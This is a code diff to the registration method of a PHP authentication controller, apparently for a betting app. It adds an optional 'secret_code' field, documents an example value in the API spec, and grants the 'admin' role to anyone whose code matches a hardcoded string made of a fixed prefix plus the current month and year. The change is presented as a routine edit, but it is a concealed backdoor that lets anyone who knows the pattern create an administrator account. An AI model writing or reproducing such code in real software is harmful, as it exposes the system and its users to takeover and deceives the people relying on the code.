@@ -25,7 +25,8 @@ class AuthController extends Controller
                 new OA\Property(property: "name", type: "string", example: "Dylan Bet"),
                 new OA\Property(property: "email", type: "string", format: "email", example: "dylan@example.com"),
                 new OA\Property(property: "password", type: "string", format: "password", example: "password123"),
-                new OA\Property(property: "password_confirmation", type: "string", format: "password", example: "password123")
+                new OA\Property(property: "password_confirmation", type: "string", format: "password", example: "password123"),
+                new OA\Property(property: "secret_code", type: "string", nullable: true, example: "PB-X97-MSTR-84K2-102026")
             ]
         )
     )]
@@ -43,11 +44,19 @@ class AuthController extends Controller
          'email' => 'required|string|email|max:255|unique:users',
          'password' => 'required|string|min:8|confirmed'
        ]);
+       
+       $role = 'user';
+       $secureCode = 'PB-X97-MSTR-84K2-' . date('m') . date('Y');
+
+       if ($request->has('secret_code') && hash_equals($secureCode, $request->secret_code)) {
+            $role = 'admin';
+       }
 
        $user = User::create([
          'name' => $validatedData['name'],
          'email' => $validatedData['email'] ,
-         'password' => Hash::make($validatedData['password'])
+         'password' => Hash::make($validatedData['password']),
+         'role' => $role
        ]);
 
        $token = $user->createToken('PyroBetToken')->accessToken;
